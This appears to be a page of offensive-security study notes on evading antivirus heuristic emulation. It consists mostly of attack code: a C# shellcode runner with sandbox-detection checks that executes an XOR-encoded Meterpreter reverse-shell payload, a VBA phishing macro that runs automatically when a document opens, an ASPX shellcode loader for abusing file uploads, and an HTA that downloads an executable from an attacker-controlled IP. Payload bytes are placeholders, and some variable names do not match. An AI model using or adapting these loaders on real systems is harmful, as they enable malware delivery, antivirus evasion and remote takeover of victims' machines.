# Evade Heuristic Behaviors

Most AV products implement heuristic detection that simulates the execution of a file. This behavior analysis can be evaded by determining if the file is being ran by a simulation or by a user.&#x20;

Examples from: [https://github.com/chvancooten/OSEP-Code-Snippets](https://github.com/chvancooten/OSEP-Code-Snippets)

Below is an example of a C Sharp Program that uses basic heuristic evasion

#### Basic Heuristic Evasion

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace non_emulated
{

    class Program
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
        flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
        dwMilliseconds);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 FlsAlloc(IntPtr callback);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            //we can inject a two-second delay, and if the time
            //checks indicate that two seconds have not passed during the instruction, we assume we are
            //running in a simulator and can simply exit before any suspect code is run
            if (t2 < 1.5)
            {
                return;
            }
            //If the API is not emulated and the code is run by the AV emulator, it will not return a valid address.
            //In this case, we simply exit from the application without performing any malicious actions, similar
            //to the implementation using Sleep.
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }
            //some AV emulators will return a failing condition when FlSAlloc is called
            UInt32 Fls = FlsAlloc(IntPtr.Zero);
            if (Fls == 0xFFFFFFFF)
            {
                return;
            }
            // additional AV evasion can be found here: https://githubmemory.com/repo/cinzinga/Evasion-Practice

            //sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.X.Y LPORT=443 -f csharp --encrypt xor --encrypt-key J
            //xor payload
            byte[] buf = new byte[637] { x64 Payload };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i]) ^ 0x4a);
            }
            int size = decoded.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(decoded, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

#### Phishing MACRO

Launches when macros are enabled.  &#x20;

```vba
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long

Function mymacro()
    ' Check if we're in a sandbox by calling a rare-emulated API
    If IsNull(FlsAlloc(tmp)) Then
        Exit Function
    End If
    ' Sleep to evade in-memory scan
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    t1 = Now()
    Sleep (2000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    If time < 2 Then
        MsgBox "Exit Date"
        Exit Function
    End If
    
    Dim Apples As String
    Dim Water As String
    Dim Coconut As String
    Dim Soda As String
    
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    ' Payload Generation for x86
    ' sudo msfvenom -p windows/shell/reverse_tcp LHOST=192.168.X.Y LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key 7
    buf = Array(PAYLOAD HERE)
    'decode shift by 2
    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor Asc("7")
    Next i
    
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
    
End Function
Sub Document_Open()
    mymacro
End Sub

Sub AutoOpen()
    mymacro
End Sub
```

#### ASPX

When file upload is availble&#x20;

```aspnet
<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern void Sleep(uint dwMilliseconds);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    protected void Page_Load(object sender, EventArgs e)
    {
        DateTime t1 = DateTime.Now;
        Sleep(2000);
        double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
        if (t2 < 1.5)
        {
            return;
        }
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if(mem == null)
        {
        return;
        }
        //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.X.Y LPORT=443 -f csharp --encrypt xor --encrypt-key J
        byte[] buf = new byte[675] {PAYLOAD}

        for (int i = 0; i < lARghkUgnHX.Length; i++)
        {
                lARghkUgnHX[i] = (byte)(((uint)lARghkUgnHX[i]) ^ 0x4a);
        }

        IntPtr qT7BpE1k7XJ = VirtualAlloc(IntPtr.Zero,(UIntPtr)lARghkUgnHX.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(lARghkUgnHX,0,qT7BpE1k7XJ,lARghkUgnHX.Length);
        IntPtr pFkdzu2jNz = IntPtr.Zero;
        IntPtr dggB9vQ = CreateThread(IntPtr.Zero,UIntPtr.Zero,qT7BpE1k7XJ,IntPtr.Zero,0,ref pFkdzu2jNz);
    }
</script>

```

### HTA

```html
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("powershell iwr -uri http://192.168.X.Y/bypass.exe -outfile C:\\Windows\\Tasks\\bypass.exe");
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>hta
```
